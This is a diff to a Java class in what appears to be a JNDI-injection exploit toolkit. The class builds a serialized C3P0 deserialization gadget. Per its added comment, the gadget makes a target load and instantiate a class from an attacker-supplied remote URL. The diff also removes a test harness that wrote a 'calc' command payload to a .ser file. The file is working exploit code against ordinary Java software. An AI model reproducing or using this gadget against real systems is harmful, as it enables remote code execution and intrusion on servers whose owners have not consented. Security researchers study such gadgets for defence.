@@ -1,7 +1,6 @@
 package com.nu1r.jndi.gadgets;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.io.PrintWriter;
 import java.sql.SQLException;
@@ -18,15 +17,21 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.mchange.v2.c3p0.PoolBackedDataSource;
 import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
 
-
+/**
+ * com.sun.jndi.rmi.registry.RegistryContext->lookup
+ * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
+ * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
+ * <p>
+ * Arguments:
+ * - base_url:classname
+ * <p>
+ * Yields:
+ * - Instantiation of remotely loaded class
+ *
+ * @author mbechler
+ */
 public class C3P0 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public static byte[] getBytes(PayloadType type) throws Exception {
         String      command = String.valueOf(type);
         int sep = command.lastIndexOf(':');
         if (sep < 0) {
@@ -51,9 +56,9 @@ public class C3P0 {
 
     private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
 
-        private String className;
+        private final String className;
 
-        private String url;
+        private final String url;
 
         public PoolSource(String className, String url) {
             this.className = className;
